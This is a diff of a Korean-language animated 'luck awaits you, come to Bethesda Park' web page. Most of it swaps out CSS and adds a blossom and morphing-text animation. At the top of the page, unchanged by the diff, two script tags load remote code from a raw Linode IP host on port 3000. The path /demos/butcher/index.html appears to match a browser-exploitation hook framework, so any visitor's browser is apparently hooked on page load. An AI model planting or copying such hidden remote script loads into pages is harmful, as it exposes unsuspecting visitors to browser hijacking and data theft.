@@ -11,293 +11,266 @@
 <script src="https://172-233-208-160.ip.linodeusercontent.com:3000"></script>
 <script src="https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html"></script>
     <style>
-        html,
-body {
-  width: 100%;
-  height: 100%;
-  margin: 0px;
-}
-
-body {
-  -webkit-touch-callout: none;
-  -webkit-user-select: none;
-  -khtml-user-select: none;
-  -moz-user-select: none;
-  -ms-user-select: none;
-  user-select: none;
-  background: #333;
-
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-#centerPoint {
-  position: absolute;
-  width: 24px;
-  height: 24px;
-  background: #7e3;
-  border-radius: 50%;
-}
-
-#line {
-  position: relative;
-  top: 120px;
-  left: -160px;
-  width: 6px;
-  height: 240px;
-  background: #7e3;
-  border-radius: 50% 50% 0 0;
-}
-
-#area {
-    margin-top: -25%;
-  width: 400px;
-  height: 600px;
-  background: seashell;
-  border-radius: 15%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  /* -webkit-transform: rotate(45deg);
--moz-transform: rotate(45deg);
--o-transform: rotate(45deg);
--ms-transform: rotate(45deg);
-transform: rotate(45deg); */
-}
-
-#container {
-  width: 320px;
-  height: 320px;
-  /* display: flex;
-	align-items: center;
-	justify-content: center; */
-}
-
-.container {
-  width: 150px;
-  height: 150px;
-  margin: 5px;
-  float: left;
-}
-
-#leaf1_0 {
-  position: relative;
-  top: 50px;
-  left: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  float: left;
-}
-
-#leaf1_1 {
-  position: relative;
-  top: -50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-#leaf1_2 {
-  position: relative;
-  top: -200px;
-  left: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-/* ********************************************* */
-
-#leaf2_0 {
-  position: relative;
-  top: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  float: left;
-}
-
-#leaf2_1 {
-  position: relative;
-  top: -100px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-#leaf2_2 {
-  position: relative;
-  top: -150px;
-  left: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-/* ********************************************* */
-
-#leaf3_0 {
-  position: relative;
-  top: 0px;
-  left: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  float: left;
-}
-
-#leaf3_1 {
-  position: relative;
-  top: -50px;
-  left: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-#leaf3_2 {
-  position: relative;
-  top: -200px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-/* ********************************************* */
-
-#leaf4_0 {
-  position: relative;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  float: left;
-}
-
-#leaf4_1 {
-  position: relative;
-  top: -100px;
-  left: 50px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-#leaf4_2 {
-  position: relative;
-  top: -150px;
-  width: 100px;
-  height: 100px;
-  background: #7e3;
-  border-radius: 50%;
-  float: left;
-}
-
-.center_container{
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-    float: center;
-    top: 50;
-    left: 50;
-}
-
-.center_font{
-    font-weight: bold;
-    font-size: 0.9rem;
-}
-
-#text {
-            position: absolute;
-            bottom: -2%;
-            text-align: center;
-            font-weight: bold;
-            font-size: 1.5rem;
-            width: 100%;
-            color: seashell;
+        @import url('https://fonts.googleapis.com/css?family=Raleway:900&display=swap');
+        
+        body {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background: linear-gradient(to right bottom, #FAF9DB, #CEEBE0);
+            margin: 0;
         }
-#text2{
-    position: absolute;
-            bottom: -5.5%;
+        .container {
             text-align: center;
-            font-weight: bold;
-            font-size: 1rem;
-            width: 100%;
-            color: seashell;
+            margin-bottom: 20px;
+            z-index: 1;
+            filter: url(#threshold) blur(0.6px);
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #00731B;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        svg {
+            transition: 1s ease-in-out;
+            position: absolute;
+        }
+        .animate {
+            animation-iteration-count: infinite;
+            animation-fill-mode: forwards;
+            animation-direction: alternate;
+        }
+        @keyframes blossom-0 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.5) rotate(30deg);
+  }
+}
+@keyframes blossom-1 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.45) rotate(60deg);
+  }
+}
+@keyframes blossom-2 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.4) rotate(45deg);
+  }
+}
+@keyframes blossom-3 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.36) rotate(30deg);
+  }
+}
+@keyframes blossom-4 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.3) rotate(45deg);
+  }
+}
+@keyframes blossom-5 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.25) rotate(60deg);
+  }
+}
+@keyframes blossom-6 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.2) rotate(30deg);
+  }
+}
+@keyframes blossom-7 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.15) rotate(60deg);
+  }
+}
+@keyframes blossom-8 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.1) rotate(45deg);
+  }
+}
+@keyframes blossom-9 {
+  0% {
+     transform:scale(0) rotate(0);
+  }
+  100% {
+   transform:scale(0.33) rotate(30deg);
+  }
 }
 
-hr{
-    position: absolute;
-    text-align: center;
-    align-items: center;
-    justify-content: center;
-    width: 90%;
-    bottom: -1%;
-    font-size: 0.8rem;
-    color: seashell;
+/*text styling*/
+
+/* Your average text styling */
+#text1, #text2 {
+	width: 90%;
+    height: 90%;
+	display: inline-block;
+	font-family: 'Raleway', sans-serif;
+	font-size: 2rem;
+    font-weight: bold;
+	z-index: 1;
+	text-align: center;
+	user-select: none;
+    background: #0ACD00;
+background: linear-gradient(to bottom, #0ACD00 20%, #0946FF 80%);
+-webkit-background-clip: text;
+-webkit-text-fill-color: transparent;
 }
     </style>
 </head>
 <body>
-    <div id="area">
-		<div id="centerPoint"></div>
-
-		<div id="container">
-			<div id="container1" class="container">
-				<div id="leaf1_0"></div>
-				<div id="leaf1_1"></div>
-				<div id="leaf1_2"></div>
-			</div>
-
-			<div id="container2" class="container">
-				<div id="leaf2_0"></div>
-				<div id="leaf2_1"></div>
-				<div id="leaf2_2"></div>
-			</div>
-
-			<div id="container3" class="container">
-				<div id="leaf3_0"></div>
-				<div id="leaf3_1"></div>
-				<div id="leaf3_2"></div>
-			</div>
-
-			<div id="container4" class="container">
-				<div id="leaf4_0"></div>
-				<div id="leaf4_1"></div>
-				<div id="leaf4_2"></div>
-			</div>
-		</div>
-
-		<div id="line"></div>
-	</div>
-
-        <p id="text">행운이 당신을 기다려요!</p>
-        <hr>
-        <p id="text2">행운 위치 : 베데스다 공원 <br></p>
+    <div class="container">
+        <div id="container">
+            <span id="text1"></span>
+            <span id="text2"></span>
+        </div>
+        
+        <!-- The SVG filter used to create the merging effect -->
+        
+    </div>
 </body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
-    var n = 0;
+    blossom();
 
-setInterval(function(){
-$("#container").css("transform", "rotate("+(n+1)%360+"deg)")
-n++;
-}, 10);
+    function blossom() {
+        for (var i = 0; i < 15; i++) {
+            var s = Math.floor(Math.random() * 10);
+            var t = Math.floor(Math.random() * 4000 + 1000);
+            var x = Math.random() * 70;
+            var y = Math.random() * 70;
+            $('body').append('<svg width="172px" height="172px" viewBox="0 0 172 172" style="top:' + x + '%;left:' + y + '%;animation-name:blossom-' + s + '; animation-duration:' + t + 'ms;" class="animate"><g transform="translate(36.000000, 0.000000)"><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86 C37.2000343,68.2812276 19.3468421,57.3786136 6.38351434,39.6288395 C-15.7380586,9.33932356 24.7463294,-13.4843611 50,9.16532067 Z" fill="#00731B" opacity="0.6"></path><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86" fill="#FFFFFF" opacity="0.1"></path></g><g id="Group" transform="translate(86.000000, 129.000000) scale(1, -1) translate(-86.000000, -129.000000) translate(36.000000, 86.000000)"><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86 C37.2000343,68.2812276 19.3468421,57.3786136 6.38351434,39.6288395 C-15.7380586,9.33932356 24.7463294,-13.4843611 50,9.16532067 Z" fill="#00731B" opacity="0.6"></path><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86" fill="#FFFFFF" opacity="0.1"></path></g><g id="Group" transform="translate(129.000000, 86.000000) rotate(90.000000) translate(-129.000000, -86.000000) translate(79.000000, 43.000000)"><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86 C37.2000343,68.2812276 19.3468421,57.3786136 6.38351434,39.6288395 C-15.7380586,9.33932356 24.7463294,-13.4843611 50,9.16532067 Z" fill="#00731B" opacity=".6"></path><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86" fill="#FFFFFF" opacity="0.1"></path></g><g id="Group" transform="translate(43.000000, 86.000000) scale(1, -1) rotate(-90.000000) translate(-43.000000, -86.000000) translate(-7.000000, 43.000000)"><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86 C37.2000343,68.2812276 19.3468421,57.3786136 6.38351434,39.6288395 C-15.7380586,9.33932356 24.7463294,-13.4843611 50,9.16532067 Z" fill="#00731B" opacity=".6"></path><path d="M50,9.16532067 C75.2536706,-13.4843611 115.738059,9.33932356 93.6164857,39.6288395 C80.6531579,57.3786136 62.7999657,68.2812276 50,86" fill="#FFFFFF" opacity="0.1"></path></g></svg>');
+        }
+    }
 
+    function toggleAnimation() {
+        $('svg').remove();
+        blossom();
+    }
 
+    /*text decoration*/
+    /*
+	This pen cleverly utilizes SVG filters to create a "Morphing Text" effect. Essentially, it layers 2 text elements on top of each other, and blurs them depending on which text element should be more visible. Once the blurring is applied, both texts are fed through a threshold filter together, which produces the "gooey" effect. Check the CSS - Comment the #container rule's filter out to see how the blurring works!
+*/
+
+const elts = {
+	text1: document.getElementById("text1"),
+	text2: document.getElementById("text2")
+};
+
+// The strings to morph between. You can change these to anything you want!
+const texts = [
+	"행운이",
+	"당신을",
+	"기다려요!",
+	"베데스다 공원\n으로",
+	"행운을\n찾아오세요!",
+];
+
+// Controls the speed of morphing.
+const morphTime = 1;
+const cooldownTime = 0.25;
+
+let textIndex = texts.length - 1;
+let time = new Date();
+let morph = 0;
+let cooldown = cooldownTime;
+
+elts.text1.textContent = texts[textIndex % texts.length];
+elts.text2.textContent = texts[(textIndex + 1) % texts.length];
+
+function doMorph() {
+	morph -= cooldown;
+	cooldown = 0;
+	
+	let fraction = morph / morphTime;
+	
+	if (fraction > 1) {
+		cooldown = cooldownTime;
+		fraction = 1;
+	}
+	
+	setMorph(fraction);
+}
+
+// A lot of the magic happens here, this is what applies the blur filter to the text.
+function setMorph(fraction) {
+	// fraction = Math.cos(fraction * Math.PI) / -2 + .5;
+	
+	elts.text2.style.filter = `blur(${Math.min(8 / fraction - 8, 100)}px)`;
+	elts.text2.style.opacity = `${Math.pow(fraction, 0.4) * 100}%`;
+	
+	fraction = 1 - fraction;
+	elts.text1.style.filter = `blur(${Math.min(8 / fraction - 8, 100)}px)`;
+	elts.text1.style.opacity = `${Math.pow(fraction, 0.4) * 100}%`;
+	
+	elts.text1.textContent = texts[textIndex % texts.length];
+	elts.text2.textContent = texts[(textIndex + 1) % texts.length];
+}
+
+function doCooldown() {
+	morph = 0;
+	
+	elts.text2.style.filter = "";
+	elts.text2.style.opacity = "100%";
+	
+	elts.text1.style.filter = "";
+	elts.text1.style.opacity = "0%";
+}
+
+// Animation loop, which is called every frame.
+function animate() {
+	requestAnimationFrame(animate);
+	
+	let newTime = new Date();
+	let shouldIncrementIndex = cooldown > 0;
+	let dt = (newTime - time) / 1000;
+	time = newTime;
+	
+	cooldown -= dt;
+	
+	if (cooldown <= 0) {
+		if (shouldIncrementIndex) {
+			textIndex++;
+		}
+		
+		doMorph();
+	} else {
+		doCooldown();
+	}
+}
+
+// Start the animation.
+animate();
 </script>
 </html>
